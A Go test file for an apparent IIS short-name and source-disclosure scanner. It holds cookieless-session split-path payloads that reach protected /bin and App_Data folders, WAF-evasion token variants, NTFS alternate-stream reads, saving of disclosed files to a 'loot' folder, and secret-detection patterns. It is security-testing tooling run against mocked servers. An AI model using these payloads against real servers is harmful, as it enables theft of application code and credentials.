package shortscan

import (
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
)

func TestSplitSegment(t *testing.T) {
	got := splitSegment("bin")
	want := [][2]string{{"b", "in"}, {"bi", "n"}}
	if len(got) != len(want) {
		t.Fatalf("splitSegment(bin) = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("split %d = %v, want %v", i, got[i], want[i])
		}
	}
	if len(splitSegment("b")) != 0 {
		t.Fatalf("a 1-char segment has no internal split")
	}
}

func TestBuildSourcePayload(t *testing.T) {
	// /(S(X))/b/(S(X))in/App.dll  — the canonical DuoDrop split-join
	got := buildSourcePayload(nil, "b", "in", []string{"App.dll"}, "S(X)")
	want := "/(S(X))/b/(S(X))in/App.dll"
	if got != want {
		t.Fatalf("buildSourcePayload = %q, want %q", got, want)
	}
	// with a leading app subfolder and a managed-only token spelling
	got = buildSourcePayload([]string{"MyApp"}, "App_Co", "de", []string{"x.txt"}, "%53(X)")
	want = "/MyApp/(%53(X))/App_Co/(%53(X))de/x.txt"
	if got != want {
		t.Fatalf("buildSourcePayload nested = %q, want %q", got, want)
	}
	// zero-length WAF-evasion spelling still reuses ONE identical token for both
	// halves (the identical-token rule the collapse requires); each half is
	// bracketed by the same /(S())…(S()) so the aggressive removal re-forms /bin/.
	got = buildSourcePayload(nil, "b", "in", []string{"App.dll"}, "S()")
	want = "/(S())/b/(S())in/App.dll"
	if got != want {
		t.Fatalf("buildSourcePayload zero-length = %q, want %q", got, want)
	}
}

// TestSourceTokensCarryWAFEvasionForms locks in that the source-disclosure
// payload set includes the verified signature-evading modifier spellings
// (zero-length, alternate-tag, compound), not only the public "(S(X))" form a
// WAF is most likely to have a rule for. All are byte-identical across both
// inserted halves via buildSourcePayload, so they collapse the same on an
// aggressive-removal build while slipping a "(S(X))"/non-empty-value signature.
func TestSourceTokensCarryWAFEvasionForms(t *testing.T) {
	have := make(map[string]bool)
	for _, s := range sourceTokens {
		have[s.tok] = true
	}
	if sourceTokens[0].tok != "S(X)" {
		t.Fatalf("canonical DuoDrop token must stay first, got %q", sourceTokens[0].tok)
	}
	for _, want := range []string{"S()", "A()", "F()"} {
		if !have[want] {
			t.Errorf("sourceTokens missing WAF-evasion spelling %q", want)
		}
	}
}

func TestSourceSplitCandidateURLTargetsProtectedSegment(t *testing.T) {
	got, ok := sourceSplitCandidateURL(
		"http://h/myapp/App_Data::$INDEX_ALLOCATION/",
		"QuarterlyCustomersExport.json",
		"S(X)",
	)
	want := "http://h/myapp/(S(X))/A/(S(X))pp_Data/QuarterlyCustomersExport.json"
	if !ok || got != want {
		t.Fatalf("sourceSplitCandidateURL = %q, %v; want %q, true", got, ok, want)
	}
	if _, ok := sourceSplitCandidateURL("http://h/uploads::$INDEX_ALLOCATION/", "x.txt", "S(X)"); ok {
		t.Fatal("non-protected folder must not produce a source-split URL")
	}
}

func TestProbeSourceSplitCandidateHEADControls(t *testing.T) {
	const candidate = "/app/(S(X))/A/(S(X))pp_Data/QuarterlyCustomersExport.json"
	var methods []string
	client := &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
		methods = append(methods, r.Method)
		status, length := http.StatusNotFound, int64(0)
		header := make(http.Header)
		if r.URL.Path == candidate {
			status, length = http.StatusOK, 71
			header.Set("Content-Type", "application/json")
			header.Set("ETag", `"stable"`)
		}
		return &http.Response{StatusCode: status, Header: header, ContentLength: length, Body: io.NopCloser(strings.NewReader("")), Request: r}, nil
	})}

	match, err := probeSourceSplitCandidate(client, &httpStats{},
		"http://example.test/app/App_Data::$INDEX_ALLOCATION/", "QuarterlyCustomersExport.json")
	if err != nil {
		t.Fatal(err)
	}
	if match.workingURL != "http://example.test"+candidate || match.status != http.StatusOK || match.token != "canonical" {
		t.Fatalf("unexpected source-split match: %#v", match)
	}
	if len(methods) != 4 {
		t.Fatalf("got %d requests, want candidate + 2 controls + repeat", len(methods))
	}
	for _, method := range methods {
		if method != http.MethodHead {
			t.Fatalf("source-split verification sent %s, want HEAD only", method)
		}
	}
}

func TestProbeSourceSplitCandidateRejectsCatchAll200(t *testing.T) {
	requests := 0
	client := &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
		requests++
		return &http.Response{StatusCode: http.StatusOK, Header: make(http.Header), ContentLength: 0, Body: io.NopCloser(strings.NewReader("")), Request: r}, nil
	})}

	match, err := probeSourceSplitCandidate(client, &httpStats{},
		"http://example.test/App_Data::$INDEX_ALLOCATION/", "Customers.json")
	if err != nil {
		t.Fatal(err)
	}
	if match.workingURL != "" {
		t.Fatalf("catch-all 200 produced a false hit: %#v", match)
	}
	if requests != 2 {
		t.Fatalf("catch-all should stop after first 200 control; got %d requests", requests)
	}
}

func TestProbeSourceSplitCandidateRejectsUnstableRepeat(t *testing.T) {
	const candidate = "/(S(X))/A/(S(X))pp_Data/Customers.json"
	candidateRequests := 0
	client := &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
		status, length := http.StatusNotFound, int64(0)
		if r.URL.Path == candidate {
			candidateRequests++
			if candidateRequests == 1 {
				status, length = http.StatusOK, 20
			}
		}
		return &http.Response{StatusCode: status, Header: make(http.Header), ContentLength: length, Body: io.NopCloser(strings.NewReader("")), Request: r}, nil
	})}

	match, err := probeSourceSplitCandidate(client, &httpStats{},
		"http://example.test/App_Data::$INDEX_ALLOCATION/", "Customers.json")
	if err != nil {
		t.Fatal(err)
	}
	if match.workingURL != "" {
		t.Fatalf("unstable candidate produced a false hit: %#v", match)
	}
	if candidateRequests != 2 {
		t.Fatalf("candidate was requested %d times, want 2", candidateRequests)
	}
}

func TestSaveDisclosedFileRejectsKnownOversizeBody(t *testing.T) {
	previousArgs := args
	defer func() { args = previousArgs }()
	args = arguments{LootDir: t.TempDir(), Retries: 0}
	client := &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
		res := responseFor(r, http.StatusOK, "MZsmall-prefix")
		res.ContentLength = (16 << 20) + 1
		return res, nil
	})}

	saved, reason, body := saveDisclosedFile(client, &httpStats{}, "http://example.test/App.dll", "App.dll")
	if saved || !strings.Contains(reason, "exceeds 16.0 MB") || len(body) == 0 {
		t.Fatalf("oversize disclosure was not safely rejected: saved=%v reason=%q bytes=%d", saved, reason, len(body))
	}
}

func TestStripIndexAllocation(t *testing.T) {
	cases := map[string]string{
		"http://h/bin::$INDEX_ALLOCATION/":       "http://h/bin",
		"http://h/App_Data::$INDEX_ALLOCATION/":  "http://h/App_Data",
		"http://h/a/bin:$i30:$INDEX_ALLOCATION/": "http://h/a/bin",
		"http://h/bin/":                          "http://h/bin/", // already clean
	}
	for in, want := range cases {
		if got := stripIndexAllocation(in); got != want {
			t.Fatalf("stripIndexAllocation(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestSourceProbeCandidateKeepsProtectedDirectoryBoundary(t *testing.T) {
	cases := map[string]string{
		"http://h/bin::$INDEX_ALLOCATION/|DefaultWsdlHelpGenerator.compiled": "http://h/bin/defaultwsdlhelpgenerator.compiled",
		"http://h/a/App_Data:$i30:$INDEX_ALLOCATION/|/Customers.json":        "http://h/a/App_Data/customers.json",
		"http://h/bin/|App.dll": "http://h/bin/app.dll",
	}
	for input, want := range cases {
		parts := strings.SplitN(input, "|", 2)
		if got := sourceProbeCandidate(parts[0], parts[1]); got != want {
			t.Fatalf("sourceProbeCandidate(%q, %q) = %q, want %q", parts[0], parts[1], got, want)
		}
	}
}

func TestIsProtectedDotNetFolder(t *testing.T) {
	yes := []string{
		"http://h/bin::$INDEX_ALLOCATION/", "http://h/App_Code/", "http://h/x/App_Data/y",
		"http://h/bin/", "http://h/APP_GLOBALRESOURCES/",
	}
	for _, u := range yes {
		if !isProtectedDotNetFolder(u) {
			t.Fatalf("%q should be a protected .NET folder", u)
		}
	}
	no := []string{"http://h/uploads/", "http://h/secure/x.aspx", "http://h/"}
	for _, u := range no {
		if isProtectedDotNetFolder(u) {
			t.Fatalf("%q must not be a protected .NET folder", u)
		}
	}
}

func TestLooksBinary(t *testing.T) {
	if !looksBinary([]byte("MZ\x90\x00")) {
		t.Fatalf("MZ header must be detected as binary")
	}
	if !looksBinary([]byte("abc\x00def")) {
		t.Fatalf("NUL byte must be detected as binary")
	}
	if looksBinary([]byte("<!DOCTYPE html><html>404</html>")) {
		t.Fatalf("plain HTML error must not be flagged binary")
	}
}

func TestInspectAssemblyBytesNonPE(t *testing.T) {
	if inspectAssemblyBytes([]byte("<!DOCTYPE html>404")) != nil {
		t.Fatalf("HTML must not be treated as an assembly")
	}
}

func TestNamespaceAndSecretFilters(t *testing.T) {
	nsYes := []string{"Acme.Internal.Billing", "MyApp.Controllers", "Contoso.Web.Admin"}
	for _, n := range nsYes {
		if !reNamespace.MatchString(n) || isFrameworkNS(n) {
			t.Fatalf("%q should be a surfaced namespace", n)
		}
	}
	nsNo := []string{"System.Web", "Microsoft.CSharp", "Compute", "get_Item", "mscorlib"}
	for _, n := range nsNo {
		if reNamespace.MatchString(n) && !isFrameworkNS(n) {
			t.Fatalf("%q should NOT be surfaced as an app namespace", n)
		}
	}
	secYes := []string{
		"Server=prod-db;User=sa;Pwd=Sup3rS3cr3t!",
		"Data Source=.;Initial Catalog=app;User Id=sa;Password=p",
		"https://github.com/acme/portal/_git/src",
	}
	for _, s := range secYes {
		if !reSecretish.MatchString(s) {
			t.Fatalf("%q should be flagged secret-ish", s)
		}
	}
	if reSecretish.MatchString("just some plain page text") {
		t.Fatalf("plain text must not be flagged secret-ish")
	}
}

// TestLooksLikeSecretValueRequiresRealAssignment locks in the fix for false
// positives found across TWO live /bin disclosures on a real target: a stock
// EntityFramework.dll (Code Contracts precondition text baked into the #US heap)
// flagged 5/5 noise, and a follow-up scan disclosing iTextSharp.dll (BouncyCastle
// crypto), Microsoft.ReportViewer.Common.dll, System.Web.Mvc.dll, and
// System.Web.Helpers.dll flagged 21 MORE "secret literal" hits — every one of
// them a bare property/field name ("password", "Authorization", "hashedPassword"),
// a dotted resource-message key ("bad.user.password"), natural-language error
// text ("No password finder specified, but a password is required"), or a UI
// description string ("text-box single-line password"). Zero were this
// deployment's own data. The common thread: none carried a real "key=value"
// assignment — which every genuine secret across both scans did.
func TestLooksLikeSecretValueRequiresRealAssignment(t *testing.T) {
	noise := []string{
		"DbContext_ConnectionStringNotFound",                 // .resx-style exception message key
		"!String.IsNullOrWhiteSpace(nameOrConnectionString)", // stringified Contract.Requires condition
		"baseConnectionString != null",                       // stringified Contract.Requires condition (no '=')
		"Data Source={0}; {1}",                               // format-string TEMPLATE, no substituted value
		"password",                                           // bare property/field name
		"Authorization",                                      // bare HTTP header name
		"ConnectionString",                                   // bare property name
		"hashedPassword",                                     // bare property name
		"pdfreader.not.opened.with.owner.password",           // dotted resource-message key
		"bad.user.password",                                  // dotted resource-message key
		"No password finder specified, but a password is required", // natural-language error text
		"master secret",                 // crypto terminology, not a value
		"text-box single-line password", // UI description string
		"x:ConnectionString",            // XML attribute NAME (no value)
	}
	for _, l := range noise {
		if looksLikeSecretValue(l) {
			t.Errorf("%q has no real key=value assignment, must NOT look like a secret value", l)
		}
	}
	real := []string{
		"Server=prod-db;User=sa;Pwd=Sup3rS3cr3t!",
		"Data Source=.\\SQLEXPRESS; Integrated Security=True; MultipleActiveResultSets=True",
		"api_key=sk_live_51H8x9K2eZvKYlo2C",
		`machineKey validationKey="ABCDEF0123456789"`, // XML attribute assignment
	}
	for _, l := range real {
		if !looksLikeSecretValue(l) {
			t.Errorf("%q carries a real key=value assignment, must still look like a secret value", l)
		}
	}
	// A Bearer token is a real secret shape even without an '=' sign.
	if !looksLikeSecretValue("Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123") {
		t.Error("a Bearer token literal must look like a secret value even without '='")
	}
	if looksLikeSecretValue("Bearer") {
		t.Error("the bare word Bearer with no token must NOT look like a secret value")
	}
}

func TestLootPathOrganisesAndSanitises(t *testing.T) {
	args.LootDir = "loot"
	// host + protected folder + filename, colon in port sanitised
	got := lootPath("http://10.0.0.5:8080/(S(d))/b/(S(d))in/EntityFramework.dll", "EntityFramework.dll")
	want := "loot/10.0.0.5_8080/EntityFramework.dll"
	if got != want {
		t.Fatalf("lootPath = %q, want %q", got, want)
	}
	// a malicious reconstructed name must not escape the loot dir
	esc := lootPath("http://h/bin/x.dll", "../../../../etc/passwd")
	if strings.Contains(esc, "..") || !strings.HasPrefix(esc, "loot/") {
		t.Fatalf("lootPath must not allow traversal, got %q", esc)
	}
	if sanitizePathSeg("a/b\\c:d") != "a_b_c_d" {
		t.Fatalf("sanitizePathSeg failed: %q", sanitizePathSeg("a/b\\c:d"))
	}
}

func TestBaseHasCookielessToken(t *testing.T) {
	yes := []string{
		"http://h/(S(d))/b/(S(d))in/",         // literal
		"http://h/%28S(d)%29/b/%28S(d)%29in/", // --session-encoding outer
	}
	for _, u := range yes {
		if !baseHasCookielessToken(u) {
			t.Fatalf("%q should be detected as a cookieless download base", u)
		}
	}
	if baseHasCookielessToken("http://h/bin::$INDEX_ALLOCATION/") {
		t.Fatalf("a plain ADS base must not look like a cookieless download")
	}
}

func TestRetrieveBaseFor(t *testing.T) {
	// same origin, ADS stripped, trailing slash
	if got := retrieveBaseFor("http://iis/davlift::$INDEX_ALLOCATION/", ""); got != "http://iis/davlift/" {
		t.Fatalf("retrieveBaseFor same-origin = %q", got)
	}
	// origin swapped to the non-IIS retrieval endpoint, path preserved
	got := retrieveBaseFor("http://iis/davlift/", "http://nginx:8443")
	if got != "http://nginx:8443/davlift/" {
		t.Fatalf("retrieveBaseFor origin-swap = %q, want http://nginx:8443/davlift/", got)
	}
	// already clean base without trailing slash gets one
	if got := retrieveBaseFor("https://h/a/b", ""); got != "https://h/a/b/" {
		t.Fatalf("retrieveBaseFor trailing = %q", got)
	}
}

func TestNormalizeRetrieveStream(t *testing.T) {
	for in, want := range map[string]string{
		"Zone.Identifier":       "Zone.Identifier",
		":hidden.txt":           "hidden.txt",
		":metadata.json:$DATA":  "metadata.json",
		" evidence.mark:$data ": "evidence.mark",
	} {
		got, err := normalizeRetrieveStream(in)
		if err != nil || got != want {
			t.Errorf("normalizeRetrieveStream(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
	for _, in := range []string{"", ":$DATA", "a:b", "../x", `x\\y`, "x?y", "x\n"} {
		if got, err := normalizeRetrieveStream(in); err == nil {
			t.Errorf("normalizeRetrieveStream(%q) = %q; want rejection", in, got)
		}
	}
}

func TestRetrieveShortNameReadsExplicitNamedStreamAfterCanonicalAlias(t *testing.T) {
	previousArgs := args
	defer func() { args = previousArgs }()

	var mu sync.Mutex
	var paths []string
	client := &http.Client{Transport: roundTripFunc(func(r *http.Request) (*http.Response, error) {
		mu.Lock()
		paths = append(paths, r.URL.Path)
		mu.Unlock()
		switch r.URL.Path {
		case "/dir/CONFID~1.TXT":
			return responseFor(r, http.StatusOK, "main-canary"), nil
		case "/dir/CONFID~1.TXT:hidden.txt:$DATA":
			return responseFor(r, http.StatusOK, "ads-canary"), nil
		default:
			return responseFor(r, http.StatusNotFound, "not found"), nil
		}
	})}

	args = arguments{
		Retrieve:        true,
		RetrieveBase:    "http://retrieve.test",
		RetrieveStreams: []string{"hidden.txt"},
		LootDir:         t.TempDir(),
		Output:          "ndjson",
	}
	retrieveShortName(client, &httpStats{}, &attackConfig{}, baseRequest{
		url: "http://iis.example/dir/", file: "CONFID", tilde: "~1", ext: ".TXT",
	})

	mu.Lock()
	joined := strings.Join(paths, "\n")
	mu.Unlock()
	if !strings.Contains(joined, "/dir/CONFID~1.TXT:hidden.txt:$DATA") {
		t.Fatalf("named ADS was not requested after canonical alias succeeded; paths:\n%s", joined)
	}
	if strings.Contains(joined, "/dir/CONFID~1.TXT::$DATA") {
		t.Fatalf("unnamed-stream fallback should not run after canonical success; paths:\n%s", joined)
	}
	for _, p := range paths {
		if strings.Contains(p, "~1.TXT:hidden.txt:$DATA") && p != "/dir/CONFID~1.TXT:hidden.txt:$DATA" {
			return // same-suffix random negative control was sent
		}
	}
	t.Fatalf("named ADS read lacked a same-suffix random negative control; paths:\n%s", joined)
}
